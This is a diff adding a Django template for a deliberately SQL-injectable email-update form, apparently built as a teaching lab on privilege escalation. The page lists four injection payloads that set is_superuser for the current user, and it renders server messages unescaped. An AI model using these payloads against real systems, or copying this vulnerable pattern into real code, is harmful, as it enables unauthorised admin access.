@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Actualitzar Email (Vulnerable a SQLi)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+        }
+        .warning {
+            background-color: #ffcccc;
+            border: 3px solid red;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .info-box {
+            background-color: #e6f7ff;
+            border: 1px solid blue;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .success {
+            background-color: #ccffcc;
+            padding: 10px;
+            border: 1px solid green;
+            border-radius: 4px;
+        }
+        .error {
+            background-color: #ffcccc;
+            padding: 10px;
+            border: 1px solid red;
+            border-radius: 4px;
+        }
+        .payload-examples {
+            background-color: #333;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            margin: 20px 0;
+        }
+        input[type=text] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #ff4444;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h2>⚠️ VULNERABLE A SQL INJECTION ⚠️</h2>
+        <p>Aquest formulari és INTENCIONADAMENT VULNERABLE per demostrar escalada de privilegis via SQLi</p>
+    </div>
+
+    <h1>Actualització de Correu Electrònic (Vulnerable)</h1>
+
+    <div class="info-box">
+        <h3>Informació de l'Usuari:</h3>
+        <table>
+            <tr>
+                <th>ID</th>
+                <th>Username</th>
+                <th>Email Actual</th>
+                <th>És Superusuari?</th>
+            </tr>
+            <tr>
+                <td>{{ usuari.id }}</td>
+                <td>{{ usuari.username }}</td>
+                <td>{{ email_actual|default:"(buit)" }}</td>
+                <td>
+                    {% if usuari.is_superuser %}
+                        <span style="color: green; font-weight: bold;">✅ SÍ (admin)</span>
+                    {% else %}
+                        <span style="color: red; font-weight: bold;">❌ NO (analista)</span>
+                    {% endif %}
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    {% if missatge %}
+        <div class="{% if 'Error' in missatge %}error{% else %}success{% endif %}">
+            {{ missatge|safe }}
+        </div>
+    {% endif %}
+
+    <form method="POST">
+        {% csrf_token %}
+        <label for="email"><strong>Nou email:</strong></label>
+        <input type="text" name="email" id="email" placeholder="exemple@correu.com" value="">
+        <button type="submit">Actualitzar Email (Vulnerable)</button>
+    </form>
+
+    <div class="payload-examples">
+        <h3>🎯 Payloads per escalar privilegis:</h3>
+        <p><strong>Objectiu:</strong> Convertir-te en superusuari (is_superuser = 1)</p>
+        <hr>
+        <p><strong>Payload 1 (bàsic):</strong> <code>hacker@evil.com', is_superuser = 1 WHERE id = {{ usuari.id }}; --</code></p>
+        <p><strong>Payload 2 (més directe):</strong> <code>', is_superuser = 1 WHERE id = {{ usuari.id }}; --</code></p>
+        <p><strong>Payload 3 (amb comentari):</strong> <code>test@test.com', is_superuser = 1 WHERE id = {{ usuari.id }}; -- -</code></p>
+        <p><strong>Payload 4 (sense email):</strong> <code>', is_superuser = 1 WHERE id = {{ usuari.id }}; --</code></p>
+    </div>
+
+    <hr>
+    <p><a href="{% url 'perfil' %}">← Tornar al Perfil</a></p>
+</body>
+</html>
+
